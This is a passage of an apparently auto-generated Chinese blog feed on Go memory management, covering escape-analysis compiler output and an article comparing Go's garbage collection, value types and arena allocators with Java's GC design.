class="hljs-keyword">go</span> build -gcflags=-m main.<span class="hljs-keyword">go</span><br># command-line-arguments<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">7</span>:<span class="hljs-number">6</span>: can inline foo<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">13</span>:<span class="hljs-number">10</span>: inlining call to foo<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">16</span>:<span class="hljs-number">13</span>: inlining call to fmt.Println<br>/<span class="hljs-keyword">var</span>/folders/<span class="hljs-number">45</span>/qx9lfw2s2zzgvhzg3mtzkwzc0000gn/T/<span class="hljs-keyword">go</span>-build409982591/b001/_gomod_.<span class="hljs-keyword">go</span>:<span class="hljs-number">6</span>:<span class="hljs-number">6</span>: can inline init<span class="hljs-number">.0</span><br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">7</span>:<span class="hljs-number">10</span>: leaking param: s<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">8</span>:<span class="hljs-number">10</span>: <span class="hljs-built_in">new</span>(A) escapes to heap<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">16</span>:<span class="hljs-number">13</span>: io.Writer(os.Stdout) escapes to heap<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">16</span>:<span class="hljs-number">13</span>: c escapes to heap<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">15</span>:<span class="hljs-number">9</span>: b + <span class="hljs-string">&quot;!&quot;</span> escapes to heap<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">13</span>:<span class="hljs-number">10</span>: main <span class="hljs-built_in">new</span>(A) does not escape<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">14</span>:<span class="hljs-number">11</span>: main a.s + <span class="hljs-string">&quot; world&quot;</span> does not escape<br>./main.<span class="hljs-keyword">go</span>:<span class="hljs-number">16</span>:<span class="hljs-number">13</span>: main []<span class="hljs-keyword">interface</span> &#123;&#125; literal does not escape<br>&lt;autogenerated&gt;:<span class="hljs-number">1</span>: os.(*File).<span class="hljs-built_in">close</span> .this does not escape<br></code></pre></td></tr></table></figure><ul><li><code>./main.go:8:10: new(A) escapes to heap</code> 说明 <code>new(A)</code> 逃逸了,符合上述提到的常见情况中的第一种。</li><li><code>./main.go:14:11: main a.s + &quot; world&quot; does not escape</code> 说明 <code>b</code> 变量没有逃逸，因为它只在方法内存在，会在方法结束时被回收。</li><li><code>./main.go:15:9: b + &quot;!&quot; escapes to heap</code> 说明 <code>c</code> 变量逃逸，通过<code>fmt.Println(a ...interface&#123;&#125;)</code>打印的变量，都会发生逃逸，感兴趣的朋友可以去查查为什么。</li><li>以上操作其实就叫<strong>逃逸分析</strong></li></ul><h2 id="如何利用逃逸分析提升性能"><a href="#如何利用逃逸分析提升性能" class="headerlink" title="如何利用逃逸分析提升性能"></a>如何利用逃逸分析提升性能</h2><h3 id="传值-VS-传指针"><a href="#传值-VS-传指针" class="headerlink" title="传值 VS 传指针"></a>传值 VS 传指针</h3><p>传值会拷贝整个对象，而传指针只会拷贝指针地址，指向的对象是同一个。传指针可以减少值的拷贝，但是会导致内存分配逃逸到堆中，增加垃圾回收(GC)的负担。在对象频繁创建和删除的场景下，传递指针导致的 GC 开销可能会严重影响性能。</p><p>一般情况下，对于需要修改原对象值，或占用内存比较大的结构体，选择传指针。对于只读的占用内存较小的结构体，直接传值能够获得更好的性能。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><hr><p>1.因为栈比堆更高效，不需要 GC，因此 Go 会尽可能的将内存分配到栈上。</p><p>2.当分配到栈上可能引起非法内存访问等问题后，会使用堆，主要场景有：</p><ol><li>当一个值可能在函数被调用后访问，这个值极有可能被分配到堆上。</li><li>当编译器检测到某个值过大，这个值会被分配到堆上。</li><li>当编译时，编译器不知道这个值的大小（slice、map…）这个值会被分配到堆上。</li></ol><p>3.Sharing down typically stays on the stack</p><p>4.Sharing up typically escapes to the heap</p><p>5.Don’t guess, Only the compiler knows</p><p>6.Golang中一个函数内局部变量，不管是不是动态new出来的，它会被分配在堆还是栈，是由编译器做逃逸分析之后做出的决定。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a><strong>参考文献</strong></h1><p>【1】Go语言设计与实现：<a href="https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-stack-management/#%E5%AF%84%E5%AD%98%E5%99%A8">https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-stack-management/#%E5%AF%84%E5%AD%98%E5%99%A8</a></p><p>【2】Inlining optimisations in Go：<a href="https://dave.cheney.net/2020/04/25/inlining-optimisations-in-go">https://dave.cheney.net/2020/04/25/inlining-optimisations-in-go</a></p><p>【3】Golang FAQ：<a href="https://golang.org/doc/faq#stack_or_heap">https://golang.org/doc/faq#stack_or_heap</a></p><p>【4】知乎：<a href="https://zhuanlan.zhihu.com/p/145468000">https://zhuanlan.zhihu.com/p/145468000</a></p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang为什么不用Java的gc模式</title>
    <link href="/2022/09/12/Golang%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%94%A8Java%E7%9A%84gc%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/09/12/Golang%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%94%A8Java%E7%9A%84gc%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"># Golang为什么不用Java的gc模式<blockquote><p><strong>为什么Go、Julia 和 Rust 等现代语言不需要像 Java C# 那样复杂的垃圾收集器？</strong></p></blockquote><p>为了解释原因，我们需要了解垃圾收集器是如何工作的，以及不同的语言如何以不同的方式分配内存。我们首先了解为什么 Java 特别需要如此复杂的垃圾收集器。</p><p>以下面几个主题为出发点来做相关介绍：</p><ul><li>为什么 Java 如此依赖快速 GC。介绍 Java 语言本身中对 GC 造成很大压力的一些设计选择。</li><li>内存碎片以及它如何影响 GC 设计。为什么这对 Java 很重要，而对 Go 却没有那么重要。</li><li>值类型以及它们如何改变 GC 。</li><li>分代GC以及为什么 Go 不需要。</li><li>逃逸分析——Go 如何用来减少 GC 压力的技巧。</li><li>分代 垃圾收集器——在 Java 世界中很重要，但 Go 以某种方式避免了对它的需求。为什么？</li><li>Concurrent Garbage Collection — Go 如何通过使用多个线程运行并发垃圾收集器来解决许多 GC 挑战。为什么使用 Java 更难做到这一点。</li><li>对 Go GC 的常见批评以及为什么批评背后的许多假设通常是有缺陷或完全错误的。</li><li>为什么低延迟对 Java 也很重要</li></ul><h2 id="为什么-Java-比其他人更需要快速-GC"><a href="#为什么-Java-比其他人更需要快速-GC" class="headerlink" title="为什么 Java 比其他人更需要快速 GC"></a>为什么 Java 比其他人更需要快速 GC</h2><p><strong>背景：</strong>Java 设计工作开始时。垃圾收集器风靡一时。研究看起来很有希望，Java 的设计者将赌注押在高级垃圾收集器上，这些垃圾收集器能够从根本上解决管理内存方面的所有挑战。</p><p>出于这个原因，Java 中的所有对象都设计为在堆上分配，但整数和浮点值等原始类型除外。在谈到内存分配时，我们一般会区分所谓的堆和栈。堆栈使用起来非常快，但空间有限，只能用于在函数调用的生命周期之后不需要存在的对象。它仅适用于局部变量。堆可用于所有对象。Java 基本上忽略了堆栈并选择在堆上分配所有内容，除了整数和浮点数等原语。每当您<code>new Something()</code>使用 Java 编写代码时，都会消耗堆上的内存。</p><p>然而，这种类型的内存管理在内存使用方面实际上是相当昂贵的。你会认为创建一个只有 32 位整数的对象只需要 4 个字节的内存。</p><p>但是，为了让垃圾收集器工作，Java 会存储一个标头，其中包含以下信息：</p><ul><li>类型 — 标识对象的类别或类型。</li><li>Lock — 用于同步语句。</li><li>标记 - 在垃圾收集器的标记和扫描面期间使用。</li></ul><p>该数据通常为 16 个字节。因此，标题数据与实际数据的比率为 4:1。Java 对象的 C++ 源代码定义为：<a href="http://hg.openjdk.java.net/jdk8/jdk8/hotspot/file/87ee5ee27509/src/share/vm/oops/oop.hpp">OpenJDK Base Class</a>。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">oopDesc</span> &#123;<br>    volatile markOop  _mark;   <span class="hljs-comment">// for mark and sweep</span><br>    Klass*           _klass;   <span class="hljs-comment">// the type</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存碎片"><a href="#内存碎片" class="headerlink" title="内存碎片"></a>内存碎片</h2><p>当 Java 分配一个对象数组时，它真正做的是创建一个引用数组，指向内存中某个其他位置的对象。这些对象最终可能分散在堆内存周围。这对性能不利，因为现代微处理器不读取单个数据字节。因为启动内存传输很慢，微处理器每次尝试访问一个特定的内存位置时总是读取一个大的连续内存块。</p><p><img src="https://cdn.jsdelivr.net/gh/longpi1/blog-img/20220912124051.png"></p><p>这块内存称为高速缓存行。CPU 有自己的高速内存，称为高速缓存。这比主存储器小得多。它用于存储最近访问的对象，因为这些对象很可能会再次被访问。如果主内存是碎片化的，这意味着高速缓存行将被碎片化，CPU 高速缓存将被大量无用数据填满。</p><p><strong>Java如何克服内存碎片</strong></p><p>为了解决这些主要缺点，Java 维护人员在高级垃圾收集器上投入了大量资金。这些做一些称为<em>压缩</em>的事情。压缩涉及在内存中移动对象并将它们收集到内存中的连续块中。这并不便宜。不仅将块从一个内存位置移动到另一个内存位置会消耗 CPU 周期，而且更新对这些对象的每个引用以指向新位置也会消耗 CPU 周期。</p><p>进行这些更新需要冻结所有线程。您不能在使用它们时更新参考。这通常会导致 Java 程序完全冻结数百毫秒，其中对象移动、引用更新和未使用的内存回收。</p><p><strong>增加复杂性</strong></p><p>为了减少这些长时间的停顿，Java 使用了所谓的<em>分代垃圾收集器</em>. 这些都是基于以下前提：</p><blockquote><p>程序中分配的大多数值很快就会被使用，因此 GC 可以花更多时间查看最近分配的对象。</p></blockquote><p>这就是为什么 Java 将它们分配的对象分成两组：</p><ul><li>旧对象——在 GC 的多次标记和清除操作中幸存下来的对象。每次标记和扫描都会更新生成计数器，以跟踪对象的年龄。</li><li>年轻对象——这些对象的生成计数器较低。这意味着它们最近才被分配。</li></ul><p>Java 更积极地调查最近分配的对象并检查它们是否应该被回收或移动。随着对象年龄的增长，它们会被移出年轻代区域。</p><p>所有这些自然会产生更多的复杂性。它需要更多的发展。</p><p><strong>现代语言如何避免与 Java 相同的陷阱</strong></p><p>现代语言不需要像 Java 和 C# 这样的复杂垃圾收集器。这是因为它们没有被设计成同样程度地依赖它们。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs smali">// Go: Make an an<span class="hljs-built_in"> array </span>of 15 000 Point objects in<br>type Point struct &#123;<br>    X, Y<span class="hljs-built_in"> int</span><br><span class="hljs-built_in"></span>&#125;<br>var points [15000]Point<br></code></pre></td></tr></table></figure><p>在上面的 Go 代码示例中，我们分配了 15000 个<code>Point</code>对象。这只是一个单一的分配，产生一个单一的指针。在 Java 中，这需要 15 000 个单独的分配，每个分配都产生一个必须管理的单独引用。每个<code>Point</code>对象都有我之前写过的 16 字节头开销。在 Go、Julia 或 Rust 中，你都不会得到这个开销。这些对象通常是无标题的。</p><p>在 Java 中，GC 获得它必须跟踪和管理的 15000 个单独的对象。Go 只有 1 个要跟踪的对象。</p><h2 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h2><p>下面的代码定义了一个矩形，其中一个<code>Min</code>和<code>Max</code>点定义了它的范围。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> <span class="hljs-type">Rect</span> struct &#123;<br>   <span class="hljs-type">Min</span>, <span class="hljs-type">Max</span> <span class="hljs-type">Point</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这成为一个连续的内存块。在 Java 中，这将变成一个<code>Rect</code>对象，其中引用了两个单独的对象，Min<code>和</code>Max<code>point 对象。因此在 Java 中，一个 的实例</code>Rect&#96;需要 3 次分配，但在 Go、Rust、C&#x2F;C++ 和 Julia 中只需要 1 次分配。</p><p><img src="https://cdn.jsdelivr.net/gh/longpi1/blog-img/image-20220912125744670.png" alt="image-20220912125744670"></p><p>左边是 Java 风格的内存碎片。在 Go、C&#x2F;C++、Julia 等中可能存在正确的连续内存块。</p><p>在将 Git 移植到 Java 时，缺少值类型会产生重大问题。没有值类型，很难获得良好的性能。正如 Shawn O. Pearce<a href="https://marc.info/?l=git&m=124111702609723">在 JGit 开发者邮件列表中所说</a>：</p><blockquote><p>JGit 苦于没有一种有效的方式来表示 SHA-1。C 可以说<code>unsigned char[20]</code>并将其内联到容器的内存分配中。<code>byte[20]</code>Java 中的A将花费<em>额外</em>的16 字节内存，并且访问速度较慢，因为字节本身与容器对象位于不同的内存区域。我们尝试通过从 a 转换为 5 个整数来解决它<code>byte[20]</code>，但这会花费我们的机器指令。</p></blockquote><p>我们在那里谈论什么？在 Go 中，我可以做与 C&#x2F;C++ 相同的事情并定义如下结构：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> <span class="hljs-type">Sha1</span> struct &#123;<br>   data [20]byte<br>&#125;<br></code></pre></td></tr></table></figure><p>然后这些字节将成为一个内存块的一部分。Java 将创建一个指向内存中其他位置的指针。</p><p>Java 开发人员意识到他们搞砸了，并且您确实需要值类型才能获得良好的性能。您可以称该陈述为夸张，但随后您需要解释<a href="https://en.wikipedia.org/wiki/Project_Valhalla_(Java_language)">Project Valhalla</a>。这是 Oracle 为提供 Java 值类型而带头的一项努力，他们阐明这样做的原因正是我在这里所说的。</p><p><strong>值类型还不够</strong></p><p>那么<em>Project Valhalla</em>会解决Java 的问题吗？并不真地。它只会使 Java 与 C# 处于同等地位。C# 在 Java 之后几年问世，并从那时起意识到垃圾收集器并不是每个人都认为的那样神奇。因此，他们添加了值类型。</p><p>但是，在内存管理灵活性方面，这并没有使 C# 和 Java 与 Go 和 C&#x2F;C++ 等语言处于同等地位。Java 不支持真正的指针。在 Go 中，我可以这样写：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Go 指针用法var </span><br>ptr *Point = &amp;rect.Min <span class="hljs-comment">// 将指向 Min 的指针存储在 ptr </span><br>*ptr = Point(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>) <span class="hljs-comment">// 替换 rect.Min</span><br></code></pre></td></tr></table></figure><p>您可以在 Go 中获取对象的地址或对象的字段，就像在 C&#x2F;C++ 中一样，并将其存储在指针中。然后，您可以传递此指针并使用它来修改它指向的字段。这意味着您可以在 Go 中创建大值对象并将其作为指向函数的指针传递以优化性能。使用 C#，情况会好一些，因为它对指针的支持<em>有限。</em>前面的 Go 示例可以用 C# 编写为：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-comment">// C# 指针用法不安全的 void foo() &#123; </span><br>   Rect* ptr = &amp;rect.Min; <br>   *ptr = <span class="hljs-keyword">new</span> Point(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>然而，C# 指针支持带有一些不适用于 Go 的警告：</p><ol><li>使用点的代码必须标记为<strong>unsafe</strong>。这会创建安全性较低且更容易崩溃的代码。</li><li>在堆栈上分配的纯值类型（所有结构字段必须是值类型）。</li><li>在已关闭垃圾收集的<strong>固定范围内，使用 fixed 关键字。</strong></li></ol><p>因此，在 C# 中使用值类型的正常且安全的方法是复制它们，因为这不需要定义不安全或固定的代码区域。但是对于较大的值类型，这可能会产生性能问题。Go 没有这些问题。您可以在 Go 中创建指向垃圾收集器管理的对象的指针。您不需要像在 C# 中那样在 Go 中使用指针来隔离代码。</p><h2 id="自定义辅助分配器"><a href="#自定义辅助分配器" class="headerlink" title="自定义辅助分配器"></a>自定义辅助分配器</h2><p>使用正确的指针，您可以做很多只有值类型时无法做到的事情。一个示例是创建辅助分配器。<a href="https://github.com/ordovician/arena">这</a>是使用 Go 泛型创建的 Arena 分配器的示例。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Arena[T any] <span class="hljs-keyword">struct</span> &#123;<br>    blocks Stack[*T]<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(arena *Arena[T])</span></span> Alloc() *T &#123;<br>    <span class="hljs-keyword">if</span> arena.blocks.IsEmpty() &#123;<br>        <span class="hljs-keyword">var</span> blocks [<span class="hljs-number">32</span>]T     <span class="hljs-comment">// allocate 32 elements at a time</span><br>        <span class="hljs-keyword">for</span> i, _ := <span class="hljs-keyword">range</span> blocks &#123;<br>            arena.blocks.Push(&amp;blocks[i])<br>        &#125;<br>    &#125;<br>    b, _ := arena.blocks.Top()<br>    arena.blocks.Pop()<br>    <span class="hljs-keyword">return</span> b<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么这些有用？如果您查看生成二叉树的算法的微基准测试，您通常会发现 Java 比 Go 具有很大优势。这是因为二叉树算法通常用于测试垃圾收集器分配对象的速度。Java 在这方面非常快，因为它使用了我们所说的凹凸指针。它只是增加一个指针，而 Go 将在内存中搜索合适的位置来分配对象。但是，使用 Arena 分配器，您也可以在 Go 中快速构建二叉树。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;golang.org/x/exp/constraints&quot;</span><br><span class="hljs-keyword">type</span> Tree[K constraints.Ordered, V any] <span class="hljs-keyword">struct</span> &#123;<br>    Root      *TreeNode[K, V]<br>    allocator Arena[TreeNode[K, V]]<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tree *Tree[K, V])</span></span> NewNode(key K, value V) *TreeNode[K, V] &#123;<br>    n := tree.allocator.Alloc()<br>    n.Key = key<br>    n.Value = value<br>    n.left = <span class="hljs-literal">nil</span><br>    n.right = <span class="hljs-literal">nil</span><br>    <span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tree *Tree[K, V])</span></span> Insert(key K, value V) &#123;<br>    n := tree.NewNode(key, value)<br>    <span class="hljs-keyword">if</span> tree.Root == <span class="hljs-literal">nil</span> &#123;<br>        tree.Root = n<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        tree.Root.Insert(n)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这就是为什么拥有真正的指针有好处的原因。没有它，您无法在连续的内存块中创建指向元素的指针。在该<code>Alloc</code>方法中，我们创建了一个由 32 个元素组成的连续块。然后，我们将指向该块中每个元素的指针存储在一个堆栈上，该堆栈包含一个可用于分配的块列表。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> blocks <span class="hljs-selector-attr">[32]</span>T <br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span>, _ := range blocks &#123; <br>    arena<span class="hljs-selector-class">.blocks</span><span class="hljs-selector-class">.Push</span>(&amp;blocks<span class="hljs-selector-attr">[i]</span>) <br>&#125;<br></code></pre></td></tr></table></figure><p>这只是可能的，因为我可以选择任意元素<code>blocks[i]</code>并获取指向该元素的指针<code>&amp;blocks[i]</code>。Java 没有给你这种可能性。</p><p>Java GC 使用的Bump分配器与 Arena 分配器类似，您只需增加一个指针即可获取下一个值。除非您不必自己构建它。这可能看起来更聪明。但这会导致 Go 中避免的几个问题：</p><ol><li>迟早您需要进行<em>压缩</em>，这涉及移动数据和修复指针。Arena 分配器不必这样做。</li><li>在多线程程序中，凹凸分配器需要锁（除非您使用线程本地存储）。这会扼杀它们的性能优势，因为锁会降低性能，或者线程本地存储会导致碎片，需要稍后进行压缩。</li></ol><p>Go 的创建者之一 Ian Lance Taylor<a href="https://groups.google.com/g/golang-nuts/c/KJiyv2mV2pU">阐明了Bump分配器的问题</a>：</p><blockquote><p>一般来说，使用一组每线程缓存分配内存可能会更有效，此时您已经失去了凹凸分配器的优势。所以我要断言，总的来说，有很多警告，今天为多线程程序使用压缩内存分配器并没有真正的优势。</p></blockquote><h2 id="逃逸分析"><a href="#逃逸分析" class="headerlink" title="逃逸分析"></a>逃逸分析</h2><p>Java 垃圾收集器还有很多工作要做，因为它分配了更多的对象。为什么？我们刚刚介绍了这一点。如果没有值对象和真正的指针，在分配大型数组或复杂数据结构时总是会以大量对象告终。因此它需要一个分代GC。</p><p>分配更少对象的需求对 Go 有利。但是 Go 还使用了另一个技巧。Go 和 Java在编译函数时都会进行所谓的<em>转义分析。</em></p><p>转义分析涉及查看在函数内部创建的指针并确定该指针是否曾经转义函数范围。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">escapingPtr</span><span class="hljs-params">()</span></span> []<span class="hljs-type">int</span> &#123; <br>   values := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>&#125;<br>   <span class="hljs-keyword">return</span> values<br>&#125; <br><br>fun nonEscapingPtr() <span class="hljs-type">int</span> &#123; <br>    values = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>&#125; <br>    <span class="hljs-keyword">var</span> total <span class="hljs-type">int</span> = addUp(values)<br>    <span class="hljs-keyword">return</span> total<br>&#125;<br></code></pre></td></tr></table></figure><p>在第一个示例中，<code>values</code>指向一个切片，它本质上与指向数组的指针相同。它逃脱，因为它被退回。这意味着<code>values</code>必须在堆上分配。</p><p>然而，在第二个例子中，没有指针<code>values</code>离开<code>nonEscapingPtr</code>函数。因此<code>values</code>可以在堆栈上分配，这非常快速且便宜。转义分析本身只是分析指针是否转义。</p><p><strong>Java Escape 分析的局限性</strong></p><p>Java 也确实逃脱了分析，但对其使用有更多限制。来自涵盖 HotSpot VM 的<a href="https://docs.oracle.com/en/java/javase/16/vm/java-hotspot-virtual-machine-performance-enhancements.html#GUID-6BD8FCB5-995B-4AE9-BFAA-B2C7DE2BA5CD">Java SE 16 Oracle 文档：</a></p><blockquote><p>它不会***将***堆分配替换为未全局转义的对象的堆栈分配。</p></blockquote><p>然而，Java 使用了一种称为<em>标量替换的替代技巧，</em>它避免了将对象放在堆栈上的需要。本质上它会爆炸和对象并将其原始成员放在堆栈上。请记住，Java 已经可以将原始值（例如<code>int</code>和<code>float</code>）放在堆栈上。<a href="https://pkolaczk.github.io/">然而，正如Piotr Kołaczkowski</a>在 2021 年发现的那样，在实践中，即使在非常微不足道的情况下，标量替换也不起作用。</p><p>相反，主要优点是避免锁定。如果您知道指针没有在函数外部使用，您还可以确定它不需要锁。</p><p><strong>Go Escape分析的优势</strong></p><p>然而，Go 使用逃逸分析来确定可以在堆栈上分配哪些对象。这显着减少了可以从分代 GC 中受益的短期对象的数量。请记住，分代 GC 的全部意义在于利用最近分配的对象存活时间短的事实。然而，Go 中的大多数对象可能会长期存在，因为短期对象很可能会被逃逸分析捕获。</p><p>与 Java 不同，这也适用于复杂对象。Java 通常只能成功地对字节数组等简单对象进行转义分析。即使是内置的<code>ByteBuffer</code>也不能使用标量替换在堆栈上分配。</p><h2 id="分代-GC-与并发-GC-暂停"><a href="#分代-GC-与并发-GC-暂停" class="headerlink" title="分代 GC 与并发 GC 暂停"></a>分代 GC 与并发 GC 暂停</h2><p>你可以读到很多关于垃圾收集器的专家声称，由于内存碎片，Go 比 Java 更有可能耗尽内存。争论是这样的：因为 Go 没有分代垃圾收集器，内存会随着时间的推移变得碎片化。当内存碎片化时，您将达到将新对象装入内存变得困难的地步。</p><p>但是，由于两个原因，此问题大大减少：</p><ol><li>Go 分配的小对象没有 Java 那么多。它可以将大型对象数组分配为单个内存块。</li><li>现代内存分配器，如 Google 的 TCMalloc 或 Intel 的 Scalable Malloc 不会对内存进行分段。</li></ol><p>在设计 Java 时，内存碎片是内存分配器的一个大问题。人们不认为它可以解决。但早在 1998 年，Java 出现后不久，研究人员就开始解决这个问题。<a href="https://dl.acm.org/doi/10.1145/286860.286864">这是 Mark S. Johnstone 和 Paul R. Wilson 的论文</a>：</p><blockquote><p>这大大加强了我们之前的结果，即内存碎片问题通常被误解，并且好的分配器策略可以为大多数程序提供良好的内存使用。</p></blockquote><p>因此，为 Java 设计内存分配策略的许多假设根本不再适用</p><p>使用分代 GC 的 Java 策略旨在缩短垃圾收集周期。请记住，Java 必须停止一切来移动数据并修复指针。如果持续时间过长，这会降低性能和响应能力。使用分代 GC，每次缩短此时间时要检查的数据更少。</p><p>然而，Go 用多种替代策略解决了同样的问题：</p><ol><li>因为不需要移动内存，也不需要固定指针，所以在 GC 运行期间要做的工作更少。Go GC 只进行标记和扫描：它通过对象图查找应该释放的对象。</li><li>它同时运行。因此，一个单独的 GC 线程可以在不停止其他线程的情况下寻找要释放的对象。</li></ol><p>为什么 Go 可以同时运行它的 GC 而不是 Java？因为 Go 不会修复任何指针或移动内存中的任何对象。因此，不存在尝试访问指向刚刚移动但该指针尚未更新的对象的指针的风险。由于某些并发线程正在运行，不再有任何引用的对象不会突然获得引用。因此，并行移除死对象是没有危险的。</p><p>这是怎么回事？假设你有 4 个线程在 Go 程序中工作。其中一个线程偶尔会在任意时间段<code>T</code>秒内完成总共 4 秒的 GC 工作。</p><p>现在想象一个带有 GC 的 Java 程序执行 GC 工作仅 2 秒。哪个程序挤出最多的性能？谁在<code>T</code>几秒钟内完成最多？听起来像 Java 程序，对吧？错误的！</p><p>Java 程序中的 4 个工作线程将所有工作停止 2 秒。<code>T</code>这意味着 2×4 &#x3D; 8 秒的工作在间隔中丢失。因此，虽然 Go 停止的时间更长，但每次停止都会影响更少的工作，因为所有线程都没有停止。因此，缓慢的并发 GC 可能会胜过依赖于停止所有线程来完成其工作的更快的 GC。</p><p><strong>如果垃圾的创建速度比 Go 清理它的速度快怎么办？</strong></p><p>反对当前垃圾收集器的一个流行论点是，您可能会遇到一种情况，即活动工作线程产生垃圾的速度比垃圾收集器线程收集垃圾的速度要快。在 Java 世界中，这被称为“并发模式故障”。</p><p>声称在这种情况下，运行时别无选择，只能完全停止您的程序并等待 GC 周期完成。因此，当 Go 声称 GC 暂停非常低时，这种说法仅适用于 GC 有足够的 CPU 时间和余量超过主程序的情况。</p><p>但是 Go 有一个巧妙的技巧来解决<a href="https://blog.golang.org/ismmkeynote">Go GC 大师 Rick Hudson 所描述的</a>这个问题。Go 使用所谓的 Pacer。</p><blockquote><p>如果需要，Pacer 会在加快标记速度的同时减慢分配速度。在高层次上，Pacer 会停止执行大量分配的 Goroutine，并将其投入到标记工作中。工作量与 Goroutine 的分配成正比。这加快了垃圾收集器的速度，同时减慢了 mutator 的速度。</p></blockquote><p>Goroutines 有点像在线程池上多路复用的绿色线程。基本上，Go 接管了正在运行产生大量垃圾的工作负载的线程，并将它们用于帮助 GC 清理这些垃圾。它只会继续接管线程，直到 GC 运行得比产生垃圾的例程快。</p><p><strong>简而言之</strong></p><p>虽然高级垃圾收集器解决了 Java 中的实际问题，但 Go 和 Julia 等现代语言一开始就简单地避免了产生这些问题，因此不再需要劳斯莱斯垃圾收集器。当您拥有值类型、转义分析、指针、多核处理器和现代分配器时，Java 设计背后的许多假设都将不复存在。它们不再适用。</p><h2 id="假定的-GC-权衡不再适用"><a href="#假定的-GC-权衡不再适用" class="headerlink" title="假定的 GC 权衡不再适用"></a>假定的 GC 权衡不再适用</h2><p>Mike Hearn 在 Medium 上有一个非常受欢迎的故事，他批评了有关 Go GC 的说法：<a href="https://blog.plan99.net/modern-garbage-collection-911ef4f8bd8e">现代垃圾收集。</a>.</p><p>Hearn 的关键信息是在 GC 